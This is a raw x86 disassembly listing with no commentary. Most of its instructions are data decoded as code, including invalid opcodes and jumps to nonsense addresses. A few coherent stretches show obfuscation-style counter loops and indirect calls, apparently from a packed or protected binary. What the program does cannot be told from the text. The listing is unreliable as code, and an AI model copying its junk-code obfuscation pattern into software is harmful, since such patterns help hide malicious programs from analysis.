  40739a:	outs   dx,BYTE PTR ds:[esi]
  40739b:	popa   
  40739c:	fisub  DWORD PTR [esi]
  40739e:	arpl   cx,di
  4073a0:	ins    BYTE PTR es:[edi],dx
  4073a1:	leave  
  4073a2:	stc    
  4073a3:	int    0x5a
  4073a5:	jno    0x407329
  4073a7:	pop    ds
  4073a8:	es daa 
  4073aa:	test   bh,bl
  4073ac:	cdq    
  4073ad:	cs mov edi,0x7fd63f67
  4073b3:	xor    bh,dh
  4073b5:	xor    al,BYTE PTR ss:[edi+0x10]
  4073b9:	push   cs
  4073ba:	xlat   BYTE PTR ds:[ebx]
  4073bb:	retf   
  4073bc:	push   edx
  4073bd:	mov    al,ds:0x826cdc0a
  4073c2:	dec    edi
  4073c3:	repz cmp BYTE PTR [ebx],cl
  4073c6:	gs int 0xec
  4073c9:	int    0x57
  4073cb:	push   edi
  4073cc:	adc    eax,0x9b8664cd
  4073d1:	pusha  
  4073d2:	jg     0x4073ae
  4073d4:	outs   dx,DWORD PTR ds:[esi]
  4073d5:	loopne 0x40739c
  4073d7:	inc    ecx
  4073d8:	add    edi,edi
  4073da:	pop    ecx
  4073db:	xor    esp,ebp
  4073dd:	dec    ecx
  4073de:	cld    
  4073df:	dec    ebx
  4073e0:	push   ss
  4073e1:	push   0x5bd4ab07
  4073e6:	pop    ecx
  4073e7:	jle    0x407446
  4073e9:	inc    ebp
  4073ea:	bnd call DWORD PTR [edi+0x6dff7119]
  4073f1:	push   esi
  4073f2:	add    BYTE PTR [ebx-0x665f481f],bh
  4073f8:	push   ds
  4073f9:	inc    eax
  4073fa:	pop    esp
  4073fb:	or     eax,0x2c9e849e
  407400:	lahf   
  407401:	test   eax,0xe53871fa
  407406:	cmc    
  407407:	jg     0x407459
  407409:	add    BYTE PTR [edi+0x74bcb268],0xb2
  407410:	push   ebp
  407411:	pop    es
  407412:	loop   0x407446
  407414:	loopne 0x4073b6
  407416:	add    eax,0x2910f4
  40741b:	test   al,0xe1
  40741d:	out    dx,al
  40741e:	mov    bl,BYTE PTR [edx-0x39]
  407421:	aaa    
  407422:	bound  ebp,QWORD PTR [eax-0x7140865f]
  407428:	xor    BYTE PTR [edx],ah
  40742a:	inc    ebp
  40742b:	add    al,0xd7
  40742d:	xor    eax,DWORD PTR [edx+0x39c3ef1d]
  407433:	test   al,0x34
  407435:	and    al,0xcf
  407437:	mov    bl,0xad
  407439:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40743b:	xlat   BYTE PTR ds:[ebx]
  40743c:	inc    ebx
  40743d:	mov    bh,0x44
  40743f:	stos   DWORD PTR es:[edi],eax
  407440:	call   0x8a90e8c5
  407445:	mov    ebp,0xd1044ed9
  40744a:	retf   0xc885
  40744d:	call   0xab9abd70
  407452:	or     ch,ch
  407454:	imul   esp,DWORD PTR [eax+0x3596c1ba],0xbc2ec376
  40745e:	data16 mov bl,0x62
  407461:	or     BYTE PTR ds:0xd9060521,ch
  407467:	iret   
  407468:	push   esi
  407469:	inc    eax
  40746a:	outs   dx,DWORD PTR ds:[esi]
  40746b:	sub    al,ah
  40746d:	jae    0x407427
  40746f:	add    al,0x8d
  407471:	mov    al,ds:0x7cb56800
  407476:	dec    eax
  407477:	or     DWORD PTR [esi-0x34ed1955],esp
  40747d:	add    al,0xa9
  40747f:	dec    BYTE PTR [eax]
  407481:	rcr    BYTE PTR [edi+0x25cd5c18],cl
  407487:	jne    0x407440
  407489:	shl    BYTE PTR [esi+esi*1-0x61352a0b],0x25
  407491:	in     al,0xfe
  407493:	mov    BYTE PTR [ebx],ah
  407495:	rcl    DWORD PTR [ebx],cl
  407497:	xor    DWORD PTR [eax+0x33],esi
  40749a:	es push eax
  40749c:	mov    esi,0x3f159248
  4074a1:	ja     0x40746b
  4074a3:	addr16 push 0xc35ee7f9
  4074a9:	adc    ah,0xa2
  4074ac:	adc    dh,BYTE PTR [ecx+0x68]
  4074af:	xchg   esi,eax
  4074b0:	pop    ds
  4074b1:	outs   dx,BYTE PTR ds:[esi]
  4074b2:	call   0x74f2:0x9ee2e8f7
  4074b9:	inc    ebp
  4074ba:	stos   DWORD PTR es:[edi],eax
  4074bb:	mov    esp,0xd7961f3e
  4074c0:	(bad)
  4074c3:	lea    ebp,[ecx]
  4074c5:	inc    ecx
  4074c6:	cmp    BYTE PTR [esi],ah
  4074c8:	xadd   BYTE PTR [ebx+edx*4],dl
  4074cc:	in     al,dx
  4074cd:	dec    edi
  4074ce:	dec    esi
  4074cf:	dec    esp
  4074d0:	pop    ebx
  4074d1:	int3   
  4074d2:	inc    esi
  4074d3:	xchg   ebp,eax
  4074d4:	test   edx,ebp
  4074d6:	popf   
  4074d7:	mov    eax,0x90353c30
  4074dc:	icebp  
  4074dd:	push   cs
  4074de:	jo     0x407541
  4074e0:	cli    
  4074e1:	sar    dh,0x45
  4074e4:	iret   
  4074e5:	fsubrp st(7),st
  4074e7:	xchg   esi,ebp
  4074e9:	mov    ebx,0x99d1503a
  4074ee:	inc    edi
  4074ef:	pop    ss
  4074f0:	xchg   ebp,eax
  4074f1:	mov    WORD PTR [ebx-0x16],ss
  4074f4:	xor    BYTE PTR [edx-0x4c0eaf93],bh
  4074fa:	xor    al,0x22
  4074fc:	mov    esi,0xcc61a26b
  407501:	inc    ebp
  407502:	adc    eax,0xe3d03547
  407507:	enter  0xe012,0x86
  40750b:	sub    al,0x63
  40750d:	or     al,0xfb
  40750f:	imul   DWORD PTR [eax]
  407511:	(bad)  [edx-0x78]
  407514:	push   esp
  407515:	and    DWORD PTR [ecx],edi
  407517:	mov    dl,0x3f
  407519:	push   ecx
  40751a:	iret   
  40751b:	cmova  eax,DWORD PTR [edx]
  40751e:	xchg   BYTE PTR [edx+0x18635037],bl
  407524:	jmp    0xf9347b79
  407529:	and    eax,0x67da0cea
  40752e:	inc    eax
  40752f:	jbe    0x40756b
  407531:	cmp    DWORD PTR [esi],edx
  407533:	xchg   BYTE PTR ds:0x43da17f1,dl
  407539:	icebp  
  40753a:	or     al,0xb9
  40753c:	sti    
  40753d:	xor    eax,0xecc53f38
  407542:	cld    
  407543:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407544:	pop    esi
  407545:	lods   al,BYTE PTR ds:[esi]
  407546:	jmp    0x5ffc5e76
  40754b:	ins    DWORD PTR es:[edi],dx
  40754c:	stc    
  40754d:	jno    0x407556
  40754f:	hlt    
  407550:	out    0x1b,eax
  407552:	xor    ecx,edx
  407554:	popa   
  407555:	fiadd  DWORD PTR [edx+0x67ac7c09]
  40755b:	inc    esp
  40755c:	xchg   DWORD PTR [eax-0x5026f4a5],esp
  407562:	loope  0x40751c
  407564:	cwde   
  407565:	enter  0x502d,0x7a
  407569:	push   ss
  40756a:	or     eax,0x7cbee41f
  40756f:	sbb    dh,BYTE PTR [eax]
  407571:	mov    ebp,0xd55b76a
  407576:	sub    eax,0x660b597c
  40757b:	mov    ds:0xd88b6c47,al
  407580:	(bad)  
  407581:	jno    0x4075a1
  407583:	push   esi
  407584:	adc    edx,0x4b206a85
  40758a:	popf   
  40758b:	scas   eax,DWORD PTR es:[edi]
  40758c:	popa   
  40758d:	lds    edi,FWORD PTR [ecx]
  40758f:	int3   
  407590:	fdivr  QWORD PTR [ecx-0x7921a766]
  407596:	sbb    BYTE PTR [ecx-0x7949fa8],ch
  40759c:	call   0x322cbb68
  4075a1:	test   DWORD PTR [eax+edi*8+0x55135],ebx
  4075a8:	add    BYTE PTR [eax+0x9577],bh
  4075ae:	mov    ecx,DWORD PTR ds:0x433653
  4075b4:	sub    DWORD PTR ds:0x43360f,ecx
  4075ba:	mov    WORD PTR [ebp-0x4],ax
  4075be:	and    ecx,0x22ab
  4075c4:	lea    eax,[ebp-0x24]
  4075c7:	sub    ecx,DWORD PTR ds:0x4335ff
  4075cd:	mov    DWORD PTR [ebp-0x28],eax
  4075d0:	mov    eax,DWORD PTR [ebp+0x8]
  4075d3:	and    DWORD PTR ds:0x43366b,0x78d4
  4075dd:	mov    DWORD PTR [ebp-0x20],eax
  4075e0:	and    DWORD PTR ds:0x43360f,0x0
  4075ea:	jmp    0x4075fc
  4075ef:	mov    ecx,DWORD PTR ds:0x43360f
  4075f5:	inc    ecx
  4075f6:	mov    DWORD PTR ds:0x43360f,ecx
  4075fc:	cmp    DWORD PTR ds:0x43360f,0x1c
  407603:	jae    0x40763a
  407609:	cmp    DWORD PTR ds:0x43360f,0x21
  407610:	jne    0x40762f
  407616:	push   DWORD PTR [ebp-0x18]
  407619:	push   0x26d9
  40761e:	push   DWORD PTR [ebp-0x1c]
  407621:	push   0x600b
  407626:	push   DWORD PTR [ebp-0x14]
  407629:	call   DWORD PTR ds:0x412348
  40762f:	jmp    0x4075ef
  407634:	xor    ecx,0x31bd
  40763a:	push   ebx
  40763b:	lea    eax,[ebp-0x18]
  40763e:	mov    DWORD PTR [ebp-0x1c],eax
  407641:	mov    eax,DWORD PTR [ebp-0x1c]
  407644:	jmp    0x40786c
  407649:	aad    0xb8
  40764b:	(bad)  
  40764c:	shl    BYTE PTR [ebx-0x20],0x75
  407650:	dec    ecx
  407651:	js     0x407697
  407653:	js     0x407668
  407655:	lds    edx,FWORD PTR [esi]
  407657:	push   ds
  407658:	aad    0x11
  40765a:	sar    BYTE PTR [esi+0x7e],0x5
  40765e:	jl     0x4076de
  407660:	jle    0x407646
  407662:	adc    eax,0x12b19437
  407667:	fldcw  WORD PTR [esi-0x21556096]
  40766d:	retf   0xc3ea
  407670:	repnz ror DWORD PTR [ebp+0x5d],0x2
  407675:	out    dx,al
  407676:	cdq    
  407677:	fld    QWORD PTR [edx]
  407679:	cmp    DWORD PTR [edi],0xe72d3454
  40767f:	(bad)  
  407680:	pop    ebx
  407681:	pop    ebp
  407682:	imul   edx,edi,0xffffff97
  407685:	(bad)  
  407686:	mov    eax,ds:0xdc84c252
  40768b:	retf   0x80fb
  40768e:	or     esp,DWORD PTR [ecx]
  407690:	push   esi
  407691:	xchg   esi,eax
  407692:	shl    BYTE PTR ds:0x66c46d3f,0x66
  407699:	ret    
  40769a:	icebp  
  40769b:	(bad)  [ecx-0x32]
  40769e:	imul   eax,eax,0xf3363226
  4076a4:	mov    esp,ebx
  4076a6:	cmp    BYTE PTR [esi-0x1c086801],bh
  4076ac:	add    al,0x69
  4076ae:	popf   
  4076af:	add    BYTE PTR [edx],ch
  4076b1:	mov    dh,ah
  4076b3:	xchg   esi,eax
  4076b4:	jno    0x407691
  4076b6:	jo     0x40766c
  4076b8:	push   cs
  4076b9:	aad    0x6f
  4076bb:	cwde   
  4076bc:	sahf   
  4076bd:	mov    al,ds:0xe1e9d33b
  4076c2:	sub    DWORD PTR [ecx+esi*4-0x5c],0x588b55a0
  4076ca:	out    0xaa,al
  4076cc:	cli    
  4076cd:	adc    BYTE PTR [esi-0x4d2f554f],0x82
  4076d4:	fld    TBYTE PTR [ecx-0x1b]
  4076d7:	cld    
  4076d8:	loop   0x4076b6
  4076da:	cdq    
  4076db:	mov    cl,0x8e
  4076dd:	xor    bl,BYTE PTR [ecx-0x78887bec]
  4076e3:	psubb  mm6,mm0
  4076e6:	sub    DWORD PTR [ebp+0x21],esp
  4076e9:	in     al,dx
  4076ea:	rcl    BYTE PTR [edx+0x57c127a4],cl
  4076f0:	and    eax,0x6ab92f40
  4076f5:	pop    ebp
  4076f6:	adc    eax,0x74515838
  4076fb:	cmp    DWORD PTR [esi],ebp
  4076fd:	imul   ebx,DWORD PTR [ebp+0x3d],0xffffffd9
  407701:	fistp  QWORD PTR [eax+eiz*4+0x584dd067]
  407708:	loop   0x407749
  40770a:	adc    bh,al
  40770c:	add    dh,bl
  40770e:	retf   
  40770f:	cmp    eax,DWORD PTR [edi]
  407711:	imul   ebx,edi,0xffffff93
  407714:	dec    edi
  407715:	xor    DWORD PTR [ebp+0x1313c96a],0xffffff95
  40771c:	adc    al,0xa5
  40771e:	jl     0x4076ec
  407720:	pop    ebx
  407721:	mov    ds:0x8b327f0a,eax
  407726:	adc    al,0x16
  407728:	mov    ch,0x28
  40772a:	inc    ebp
  40772b:	push   cs
  40772c:	inc    esi
  40772d:	cwde   
  40772e:	jl     0x407701
  407730:	dec    esi
  407731:	jae    0x407701
  407733:	les    esp,FWORD PTR [eax+edi*4]
  407736:	(bad)  [ebx+esi*4+0x8713e8b]
  40773d:	lods   eax,DWORD PTR ds:[esi]
  40773e:	push   ds
  40773f:	lea    ebp,[ecx]
  407741:	adc    eax,0x4c9891b
  407746:	lahf   
  407747:	fisttp WORD PTR [eax+esi*4-0x47c73b64]
  40774e:	cmp    dh,BYTE PTR [edi-0x6dc03aee]
  407754:	outs   dx,DWORD PTR ds:[esi]
  407755:	imul   ebx,ebx,0x6e
  407758:	and    BYTE PTR [ecx+0x5925bb09],dl
  40775e:	mov    al,BYTE PTR ds:0x64efb8ba
  407764:	popa   
  407765:	fcmovu st,st(1)
  407767:	sub    ebx,ebx
  407769:	pop    ebp
  40776a:	dec    edi
  40776b:	test   eax,0xd5863227
  407770:	lahf   
  407771:	push   0x69
  407773:	xchg   esp,eax
  407774:	cmp    ebx,DWORD PTR [eax-0x5afa11d]
  40777a:	sbb    DWORD PTR [ecx-0x63],esp
  40777d:	mov    ecx,0xb23c3c6e
  407782:	sub    edi,DWORD PTR [esi+0x18]
  407785:	xchg   BYTE PTR [ebx-0x23],ah
  407788:	aad    0xc7
  40778a:	or     al,0x5f
  40778c:	mov    ds:0x760c047b,al
  407791:	in     eax,0xb3
  407793:	xchg   ebx,eax
  407794:	ds xchg edx,eax
  407796:	leave  
  407797:	sub    BYTE PTR [eax+eax*4-0x4],0x9d
  40779c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40779d:	push   esp
  40779e:	dec    ecx
  40779f:	mov    bl,BYTE PTR [eax-0x6]
  4077a2:	and    esp,ebx
  4077a4:	gs dec esi
  4077a6:	pop    edx
  4077a7:	ret    0x54b3
  4077aa:	mov    al,bh
  4077ac:	and    BYTE PTR [esi+0x5580ef1b],cl
  4077b2:	imul   edi,DWORD PTR [edx+0x32db3a0a],0x97f303ed
  4077bc:	xor    al,0xa0
  4077be:	mov    eax,0x1523182b
  4077c3:	add    eax,0x5bd34800
  4077c8:	mov    esp,db6
  4077cb:	inc    esp
  4077cc:	stos   BYTE PTR es:[edi],al
  4077cd:	xor    BYTE PTR [ebx+0x290ffe57],ah
  4077d3:	mov    bl,0x26
  4077d5:	push   ebx
  4077d6:	in     al,0x37
  4077d8:	push   ss
  4077d9:	dec    esp
  4077da:	fsubr  QWORD PTR [edx+edi*1]
  4077dd:	and    DWORD PTR [edx],esi
  4077df:	mov    ecx,0xf2386521
  4077e4:	xor    eax,0x4247ec4e
  4077e9:	dec    ebx
  4077ea:	sub    ecx,ebp
  4077ec:	inc    esp
  4077ed:	pop    es
  4077ee:	leave  
  4077ef:	and    eax,0x6b24f65b
  4077f4:	and    BYTE PTR [esi],al
  4077f6:	push   edx
  4077f7:	pop    ecx
  4077f8:	inc    edi
  4077f9:	ds in  eax,dx
  4077fb:	ss jle 0x407859
  4077fe:	rcl    DWORD PTR [esi],cl
  407800:	add    edi,DWORD PTR [eax-0x32]
  407803:	dec    BYTE PTR [eax]
  407805:	xor    DWORD PTR ds:0x1e3d74f8,esi
  40780b:	stc    
  40780c:	repnz popa 
  40780e:	inc    eax
  40780f:	addr16 add al,0x1e
  407812:	jecxz  0x407828
  407814:	sahf   
  407815:	jne    0x407817
  407817:	adc    bh,bl
  407819:	push   ss
  40781a:	cmp    ebp,edi
  40781c:	mov    eax,0x41005c15
  407821:	mov    ah,0x11
  407823:	or     DWORD PTR [edx],0xd45fbc75
  407829:	popf   
  40782a:	mov    ebp,0x129b591f
  40782f:	xchg   ebx,eax
  407830:	mov    DWORD PTR [edi+eax*4-0x4e012568],ecx
  407837:	call   0xd5e35bc3
  40783c:	inc    esi
  40783d:	enter  0xeae2,0x97
  407841:	and    BYTE PTR [esi],ch
  407843:	ja     0x4078c4
  407845:	xchg   ecx,eax
  407846:	mov    al,0x90
  407848:	retf   0x9005
  40784b:	xchg   edx,eax
  40784c:	jo     0x407830
  40784e:	dec    edi
  40784f:	push   ss
  407850:	ret    
  407851:	xor    DWORD PTR [esi],edx
  407853:	inc    edi
  407854:	mov    dl,0x72
  407856:	ds scas eax,DWORD PTR es:[edi]
  407858:	pop    esp
  407859:	or     ebp,eax
  40785b:	out    dx,eax
  40785c:	sub    DWORD PTR [edi+0x1512b0d7],ebx
  407862:	mov    al,0x8f
  407864:	push   ss
  407865:	(bad)  
  407866:	mov    al,0xf8
  407868:	repz pop esi
  40786a:	sahf   
  40786b:	cld    
  40786c:	push   esi
  40786d:	sub    ecx,esi
  40786f:	push   edi
  407870:	mov    edi,0xf89f2da9
  407875:	xor    DWORD PTR ds:0x4335ff,0x433663
  40787f:	mov    DWORD PTR [eax],edi
  407881:	mov    DWORD PTR ds:0x43371b,0x12
  40788b:	cmp    DWORD PTR ds:0x43371b,0x0
  407892:	je     0x4078c1
  407898:	cmp    DWORD PTR ds:0x43371b,0x14
  40789f:	jne    0x4078b1
  4078a5:	push   DWORD PTR [ebp-0x28]
  4078a8:	push   DWORD PTR [ebp-0x1c]
  4078ab:	call   DWORD PTR ds:0x41234c
  4078b1:	mov    eax,ds:0x43371b
  4078b6:	dec    eax
  4078b7:	mov    ds:0x43371b,eax
  4078bc:	jmp    0x40788b
  4078c1:	mov    eax,DWORD PTR [ebp-0x14]
  4078c4:	mov    ebx,DWORD PTR [ebp-0x8]
  4078c7:	and    DWORD PTR ds:0x43369f,0x0
  4078d1:	xor    esi,esi
  4078d3:	xor    esi,DWORD PTR ds:0x43369f
  4078d9:	inc    esi
  4078da:	mov    DWORD PTR ds:0x43369f,esi
  4078e0:	cmp    DWORD PTR ds:0x43369f,0x1c
  4078e7:	jne    0x4078f6
  4078ed:	push   DWORD PTR [ebp-0x28]
  4078f0:	call   DWORD PTR ds:0x4120d0
  4078f6:	cmp    DWORD PTR ds:0x43369f,0x18
  4078fd:	jb     0x4078d1
  407903:	xor    esi,0x6b5
  407909:	mov    ecx,0x7510854
  40790e:	neg    esi
  407910:	jmp    0x407b38
  407915:	loopne 0x4078c8
  407917:	test   DWORD PTR [edx+0x71f1b255],esi
  40791d:	cmp    dh,cl
  40791f:	pop    ebp
  407920:	out    0xf9,eax
  407922:	mov    dh,0x5b
  407924:	push   es
  407925:	and    al,0xce
  407927:	jle    0x4079a7
  407929:	add    eax,0xa67e7e7c
  40792e:	rol    DWORD PTR [edi-0x521997c6],1
  407934:	js     0x4079a4
  407936:	mov    ds:0xa207ec06,al
  40793b:	enter  0xb366,0xa2
  40793f:	inc    eax
  407940:	inc    esi
  407941:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407942:	jl     0x40798a
  407944:	repz pop edx
  407946:	adc    ebx,eax
  407948:	mov    dh,0xea
  40794a:	xchg   ch,bl
  40794c:	stc    
  40794d:	cdq    
  40794e:	ds or  eax,0xa31af0e1
  407954:	(bad)  
  407955:	std    
  407956:	and    eax,0xa929ca16
  40795b:	gs js  0x4078fd
  40795e:	inc    ecx
  40795f:	sti    
  407960:	das    
  407961:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407962:	mov    ds:0x30c02a0f,eax
  407967:	jmp    0xf1e42340
  40796c:	mov    eax,0x31f0fda7
  407971:	retf   0x549
  407974:	jae    0x407930
  407976:	psubq  mm7,QWORD PTR [edx+0x75371a91]
  40797d:	adc    esi,DWORD PTR [ebx]
  40797f:	add    DWORD PTR [ebp+ecx*2+0x447c704d],0x9d3c3e21
  40798a:	mov    ds:0x629dc44e,al
  40798f:	mov    al,0xb7
  407991:	call   0x4d4c:0x290d1d0c
  407998:	cmp    edi,0x3a
  40799b:	in     eax,dx
  40799c:	and    al,0x7a
  40799e:	inc    eax
  40799f:	imul   ecx,esi,0xffffffe6
  4079a2:	sub    bl,BYTE PTR [eax+0x10]
  4079a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4079a6:	fldcw  WORD PTR [eax-0x5f0272cc]
  4079ac:	jg     0x407976
  4079ae:	fcomp  DWORD PTR [esi]
  4079b0:	adc    ebp,ecx
  4079b2:	sbb    eax,0x7c893fad
  4079b7:	aas    
  4079b8:	or     DWORD PTR [esi-0x24],ebx
  4079bb:	ss sti 
  4079bd:	dec    eax
  4079be:	push   edx
  4079bf:	sub    ecx,DWORD PTR [ebx+ebp*4+0x46da534b]
  4079c6:	or     ch,BYTE PTR [di]
  4079c9:	sar    BYTE PTR [eax+0x5a45f9aa],1
  4079cf:	xchg   BYTE PTR [esp+edi*1],ah
  4079d2:	add    DWORD PTR [ebx+0x42],ebx
  4079d5:	scas   al,BYTE PTR es:[edi]
  4079d6:	mov    ebp,0xfaae6a51
  4079db:	lds    ebx,FWORD PTR [ecx]
  4079dd:	js     0x4079ce
  4079df:	les    esi,FWORD PTR [edi+0x7b3d97bb]
  4079e5:	ret    0x8767
  4079e8:	(bad)  
  4079e9:	addr16 (bad) 
  4079ec:	push   eax
  4079ed:	mov    al,0x2c
  4079ef:	out    dx,al
  4079f0:	push   esp
  4079f1:	and    eax,0xfec6e374
  4079f6:	or     DWORD PTR [esi+0x2f],eax
  4079f9:	dec    ebp
  4079fa:	xor    esp,DWORD PTR [esi-0x4b6ca695]
  407a00:	pop    ecx
  407a01:	add    DWORD PTR [eax],ebx
  407a03:	adc    ebp,ecx
  407a05:	mov    ebx,0xaf169e30
  407a0a:	test   DWORD PTR [ebx],eax
  407a0c:	sub    ebp,edx
  407a0e:	and    DWORD PTR [ecx+0x6934f375],ebp
  407a14:	push   0x18
  407a16:	iret   
  407a17:	icebp  
  407a18:	cld    
  407a19:	stos   BYTE PTR es:[edi],al
  407a1a:	jecxz  0x407a46
  407a1c:	sbb    eax,DWORD PTR [esp+ecx*2]
  407a1f:	xchg   ecx,eax
  407a20:	mov    WORD PTR [edi+0x44],es
  407a23:	and    al,0xc3
  407a25:	js     0x407a66
  407a27:	jg     0x4079aa
  407a29:	data16 jno 0x407a29
  407a2c:	xchg   DWORD PTR [eax-0x6101e5fc],edi
  407a32:	ret    0x268a
  407a35:	sub    DWORD PTR cs:[ecx],edi
  407a38:	das    
  407a39:	and    BYTE PTR [eax+esi*8],0x4b
  407a3d:	shr    DWORD PTR [ecx-0x5724c2d0],1
  407a43:	cmp    eax,0xd15b0f1
  407a48:	inc    esp
  407a49:	mov    ds:0xe77b8995,eax
  407a4e:	(bad)
  407a51:	js     0x407aad
  407a53:	aas    
  407a54:	ror    DWORD PTR [edx-0x73],cl
  407a57:	mov    eax,ds:0xe17dc55e
  407a5c:	jno    0x407a56
  407a5e:	mov    ecx,DWORD PTR ds:0xdd40467b
  407a64:	or     BYTE PTR [ebx-0x75],0xad
  407a68:	dec    ecx
  407a69:	fadd   DWORD PTR [edx-0x11]
  407a6c:	inc    ecx
  407a6d:	inc    edx
  407a6e:	es push ebp
  407a70:	mov    dh,0xe2
  407a72:	loop   0x407a9f
  407a74:	hlt    
  407a75:	xchg   DWORD PTR fs:[edx],edx
  407a78:	dec    ecx
  407a79:	hlt    
  407a7a:	adc    eax,0x8565110c
  407a7f:	xchg   ebp,eax
  407a80:	sbb    edi,0x12
  407a83:	jmp    0x407a62
  407a85:	cmp    BYTE PTR [ecx+ebp*4-0x5d],0x61
  407a8a:	popf   
  407a8b:	fisttp QWORD PTR [ebx-0x2c]
  407a8e:	mov    ds:0x7b6910a5,eax
  407a93:	sub    esi,0xffffffca
  407a96:	adc    ebx,ebp
  407a98:	jno    0x407af4
  407a9a:	dec    eax
  407a9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407a9c:	call   0x7e9c41df
  407aa1:	sbb    al,0x7e
  407aa3:	(bad)  
  407aa5:	(bad)  [edx-0x4]
  407aa8:	push   ebx
  407aa9:	mov    cl,0x8e
  407aab:	int    0xd5
  407aad:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  407aaf:	inc    ecx
  407ab0:	sub    BYTE PTR [ecx],bl
  407ab2:	inc    ebx
  407ab3:	xor    bl,dh
  407ab5:	mov    ah,0x85
  407ab7:	fwait
  407ab8:	jne    0x407a66
  407aba:	cmc    
  407abb:	shr    DWORD PTR [ebx+0x178ecc42],0xfb
  407ac2:	mov    esi,0x731b3cbf
  407ac7:	aad    0xe5
  407ac9:	mov    eax,ds:0xe22b3f25
  407ace:	xchg   ebx,eax
  407acf:	addr16 mov dh,0xe
  407ad2:	jo     0x407ad3
  407ad4:	xor    al,0xb1
  407ad6:	dec    esp
  407ad7:	inc    eax
  407ad8:	loop   0x407b2e
  407ada:	inc    edx
  407adb:	test   al,0x14
  407add:	adc    ebx,DWORD PTR [ebx+0x2d2e5fd7]
  407ae3:	and    edx,edx
  407ae5:	sub    edi,ebp
  407ae7:	retf   
  407ae8:	jecxz  0x407afe
  407aea:	cdq    
  407aeb:	xor    dl,BYTE PTR [ebx-0x31123aca]
  407af1:	jno    0x407af5
  407af3:	jno    0x407ab3
  407af5:	adc    cl,cl
  407af7:	jmp    0x41611a22
  407afc:	gs int 0x50
  407aff:	pusha  
  407b00:	in     al,0x80
  407b02:	in     al,dx
  407b03:	mov    BYTE PTR [esi+0x6dd63c35],ah
  407b09:	lahf   
  407b0a:	(bad)  
  407b0b:	xor    edx,ebx
  407b0d:	ret    0x5743
  407b10:	popf   
  407b11:	nop
  407b12:	shl    dl,0x5
  407b15:	enter  0x18a9,0x38
  407b19:	push   ecx
  407b1a:	or     eax,0x4e98c9f
  407b1f:	push   0x49
  407b21:	jg     0x407b2f
  407b23:	push   esp
  407b24:	inc    esi
  407b25:	and    eax,ebx
  407b27:	mov    eax,0x16f18675
  407b2c:	icebp  
  407b2d:	pop    es
  407b2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b2f:	out    dx,al
  407b30:	stc    
  407b31:	or     dh,bl
  407b33:	inc    ecx
  407b34:	ins    BYTE PTR es:[edi],dx
  407b35:	adc    al,0x88
  407b37:	mov    WORD PTR [ebx],?
  407b39:	rol    DWORD PTR [ecx+0x4336ab15],0x0
  407b40:	outs   dx,BYTE PTR ds:[esi]
  407b41:	sbb    al,0x0
  407b43:	add    BYTE PTR [esi+0x32729b],bh
  407b49:	mov    DWORD PTR ds:0x433653,0x57a0
  407b53:	xor    ebx,ecx
  407b55:	add    DWORD PTR ds:0x433607,0x7d23
  407b5f:	xor    edx,edx
  407b61:	and    DWORD PTR ds:0x43372f,0x43360f
  407b6b:	add    eax,esi
  407b6d:	neg    DWORD PTR ds:0x43369f
  407b73:	add    ebx,esi
  407b75:	inc    DWORD PTR ds:0x433603
  407b7b:	div    ebx
  407b7d:	mov    edx,DWORD PTR [ebp-0x20]
  407b80:	mov    DWORD PTR ds:0x4336a7,0x7c8f
  407b8a:	mov    DWORD PTR [ebp-0x2c],0x4ec1
  407b91:	mov    DWORD PTR ds:0x43361f,0x3db9
  407b9b:	cmp    eax,DWORD PTR [edx]
  407b9d:	je     0x407f52
  407ba3:	mov    DWORD PTR ds:0x43366b,0x500e
  407bad:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  407bb4:	and    DWORD PTR ds:0x43366b,0x1370
  407bbe:	lea    eax,[ebp-0xc]
  407bc1:	xor    edx,DWORD PTR ds:0x4336d7
  407bc7:	mov    DWORD PTR [ebp-0x10],eax
  407bca:	and    eax,eax
  407bcc:	mov    eax,DWORD PTR [ebp-0x10]
  407bcf:	mov    DWORD PTR ds:0x433657,0x11
  407bd9:	cmp    DWORD PTR ds:0x433657,0x0
  407be0:	je     0x407c31
  407be6:	cmp    DWORD PTR ds:0x433657,0x6
  407bed:	jne    0x407c03
  407bf3:	push   0x578e
  407bf8:	push   0x5398
  407bfd:	call   DWORD PTR ds:0x41229c
  407c03:	cmp    DWORD PTR ds:0x433657,0x7
  407c0a:	jne    0x407c1f
  407c10:	xor    edx,edx
  407c12:	add    edx,DWORD PTR ds:0x433657
  407c18:	dec    edx
  407c19:	mov    DWORD PTR ds:0x433657,edx
  407c1f:	mov    edx,DWORD PTR ds:0x433657
  407c25:	dec    edx
  407c26:	mov    DWORD PTR ds:0x433657,edx
  407c2c:	jmp    0x407bd9
  407c31:	mov    edx,DWORD PTR [eax]
  407c33:	imul   edx,edx,0xf89ea9ee
  407c39:	jmp    0x407e61
  407c3e:	and    BYTE PTR [edi-0x2b],al
  407c41:	out    0x71,al
  407c43:	je     0x407c76
  407c45:	inc    ecx
  407c46:	adc    al,0x2f
  407c48:	sbb    ecx,esi
  407c4a:	ja     0x407c17
  407c4c:	mov    al,0x1d
  407c4e:	sub    ecx,esp
  407c50:	jle    0x407cd0
  407c52:	add    eax,0xc67e7e7c
  407c57:	lods   eax,DWORD PTR ds:[esi]
  407c58:	sti    
  407c59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407c5a:	mov    DWORD PTR [ebx+0x60],0x659f8ed
  407c61:	stos   BYTE PTR es:[edi],al
  407c62:	scas   eax,DWORD PTR es:[edi]
  407c63:	jo     0x407cda
  407c65:	imul   eax,DWORD PTR [eax-0x1f],0xffffffed
  407c69:	int3   
  407c6a:	inc    edi
  407c6b:	jmp    0xc8ffaf03
  407c70:	jb     0x407c54
  407c72:	jmp    0x16ee6e4
  407c77:	sbb    eax,0xc87ed391
  407c7c:	xchg   edi,eax
  407c7d:	repz jmp 0x407cc5
  407c80:	test   al,0x1e
  407c82:	out    0x9a,al
  407c84:	xchg   ebx,eax
  407c85:	dec    eax
  407c86:	iret   
  407c87:	je     0x407c35
  407c89:	push   ebp
  407c8a:	rol    BYTE PTR [ebp+0xe],cl
  407c8d:	adc    eax,0x16ea9c91
  407c92:	leave  
